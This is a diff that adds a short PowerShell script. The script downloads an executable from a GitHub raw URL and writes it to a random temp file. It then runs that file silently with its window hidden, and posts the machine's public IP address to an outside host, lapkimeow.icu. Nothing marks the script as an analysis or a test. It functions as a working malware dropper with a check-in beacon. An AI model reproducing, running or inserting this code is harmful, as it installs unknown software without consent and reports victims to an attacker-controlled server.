@@ -1,0 +1,24 @@
+$url = "https://raw.githubusercontent.com/SashaP20/Get-Doctor/refs/heads/main/unins000.exe"
+$response = Invoke-WebRequest -Uri $url -UseBasicParsing
+$fileBytes = $response.Content
+if (-not ([AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { $_.GetTypes() } | Where-Object { $_.Name -eq "MemoryExec" })) {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Diagnostics;
+    using System.IO;
+    public class MemoryExec {
+        public static void Run(byte[] exeBytes) {
+            string tempFilePath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
+            File.WriteAllBytes(tempFilePath, exeBytes);
+            Process process = new Process();
+            process.StartInfo.FileName = tempFilePath;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            process.Start();
+        }
+    }
+"@
+}
+[MemoryExec]::Run($fileBytes)
+Invoke-RestMethod -Uri "https://lapkimeow.icu/run" -Method Post -Body (@{ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip")} | ConvertTo-Json) -Headers @{ "Content-Type" = "application/json" } | Out-Null
